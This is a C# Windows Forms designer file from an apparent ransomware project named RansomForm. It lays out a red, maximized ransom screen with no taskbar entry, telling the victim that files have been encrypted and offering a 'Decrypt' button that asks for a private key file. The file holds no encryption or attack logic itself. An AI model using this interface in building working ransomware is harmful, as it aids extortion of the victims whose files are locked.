namespace RansomForm
{
    partial class Form1
    {
        /// <summary>
        ///  Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///  Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        ///  Required method for Designer support - do not modify
        ///  the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
      this.lblCount = new System.Windows.Forms.Label();
      this.encryptedFileslbl = new System.Windows.Forms.Label();
      this.buttonDecrypt = new System.Windows.Forms.Button();
      this.labelMain = new System.Windows.Forms.Label();
      this.label1a = new System.Windows.Forms.Label();
      this.SuspendLayout();
      // 
      // lblCount
      // 
      this.lblCount.AutoSize = true;
      this.lblCount.BackColor = System.Drawing.Color.WhiteSmoke;
      this.lblCount.Location = new System.Drawing.Point(175, 145);
      this.lblCount.Name = "lblCount";
      this.lblCount.Size = new System.Drawing.Size(65, 15);
      this.lblCount.TabIndex = 0;
      this.lblCount.Text = "labelCount";
      // 
      // encryptedFileslbl
      // 
      this.encryptedFileslbl.AutoSize = true;
      this.encryptedFileslbl.Location = new System.Drawing.Point(175, 169);
      this.encryptedFileslbl.Name = "encryptedFileslbl";
      this.encryptedFileslbl.Size = new System.Drawing.Size(108, 15);
      this.encryptedFileslbl.TabIndex = 1;
      this.encryptedFileslbl.Text = "labelEncryptedFiles";
      // 
      // buttonDecrypt
      // 
      this.buttonDecrypt.Location = new System.Drawing.Point(228, 587);
      this.buttonDecrypt.Name = "buttonDecrypt";
      this.buttonDecrypt.Size = new System.Drawing.Size(272, 47);
      this.buttonDecrypt.TabIndex = 2;
      this.buttonDecrypt.Text = "Decrypt";
      this.buttonDecrypt.UseVisualStyleBackColor = true;
      this.buttonDecrypt.Click += new System.EventHandler(this.buttonDecrypt_Click);
      // 
      // labelMain
      // 
      this.labelMain.AutoSize = true;
      this.labelMain.Location = new System.Drawing.Point(175, 62);
      this.labelMain.Name = "labelMain";
      this.labelMain.Size = new System.Drawing.Size(174, 15);
      this.labelMain.TabIndex = 3;
      this.labelMain.Text = "These files have been encrypted";
      // 
      // label1a
      // 
      this.label1a.AutoSize = true;
      this.label1a.BackColor = System.Drawing.Color.Transparent;
      this.label1a.Font = new System.Drawing.Font("Segoe UI", 18F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
      this.label1a.Location = new System.Drawing.Point(32, 552);
      this.label1a.Name = "label1a";
      this.label1a.Size = new System.Drawing.Size(684, 32);
      this.label1a.TabIndex = 4;
      this.label1a.Text = "Place the private key file and click decrypt to retrieve your files";
      // 
      // Form1
      // 
      this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
      this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.Red;
      this.ClientSize = new System.Drawing.Size(766, 741);
      this.Controls.Add(this.label1a);
      this.Controls.Add(this.labelMain);
      this.Controls.Add(this.buttonDecrypt);
      this.Controls.Add(this.encryptedFileslbl);
      this.Controls.Add(this.lblCount);
      this.Name = "Form1";
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
      this.Text = "Form1";
      this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
      this.Load += new System.EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
      this.PerformLayout();

        }

        #endregion

        private Label lblCount;
        private Label encryptedFileslbl;
        private Button buttonDecrypt;
        private Label labelMain;
    private Label label1a;
  }
}